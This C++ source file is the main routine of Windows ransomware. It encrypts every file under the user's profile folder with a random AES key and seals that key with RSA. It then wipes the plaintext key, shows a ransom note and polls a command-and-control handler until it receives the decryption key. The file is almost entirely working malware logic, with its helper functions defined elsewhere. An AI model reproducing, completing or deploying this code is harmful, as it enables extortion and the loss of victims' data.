#include "../include/headers.h"
#include <shlobj.h>

#define OPERATION_SUCCEEDED 0
#define OPERATION_FAILED 1

int main() {
	BCRYPT_ALG_HANDLE hAlgorithm = NULL;
	WCHAR userProfilePath[MAX_PATH] = { 0 };

	if (!SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfilePath))) {
		return OPERATION_FAILED;
	}
	std::wstring targetDir = std::wstring(userProfilePath);

	if (!set_algorithm(hAlgorithm, BCRYPT_AES_ALGORITHM)) return OPERATION_FAILED;

	std::vector<BYTE> iv(16), key(16), newKey, decrypted_key;

	if (!gen_rand(iv)) return OPERATION_FAILED;
	if (!gen_rand(key)) return OPERATION_FAILED;

	DWORD keyObjLen = 0, dummy = 0;
	NTSTATUS status = BCryptGetProperty(
		hAlgorithm,
		BCRYPT_OBJECT_LENGTH,
		(PUCHAR)&keyObjLen,
		sizeof(DWORD),
		&dummy,
		0
	);
	if (!BCRYPT_SUCCESS(status)) {
		return OPERATION_FAILED;
	}

	traverse_dir(1, targetDir.c_str(), hAlgorithm, iv, key, keyObjLen, true);
	
	if (!rsa_encrypt(key, newKey)) return OPERATION_FAILED;

	SecureZeroMemory(key.data(), key.size());
	key.clear();
	key.shrink_to_fit();


	display_ransom_note();
	do {
		if (!c2_handler(decrypted_key, newKey)) {
			_tprintf(TEXT("internet access required\n"));
			continue;
		}
		else {
			if (decrypted_key.size() == 9) {
				_tprintf(TEXT("invalid token\n"));
			}
		}
	} while (decrypted_key.size() == 9);

	traverse_dir(1, targetDir.c_str(), hAlgorithm, iv, decrypted_key, keyObjLen, false);
	

	BCryptCloseAlgorithmProvider(hAlgorithm, 0);

	return OPERATION_SUCCEEDED; 
}
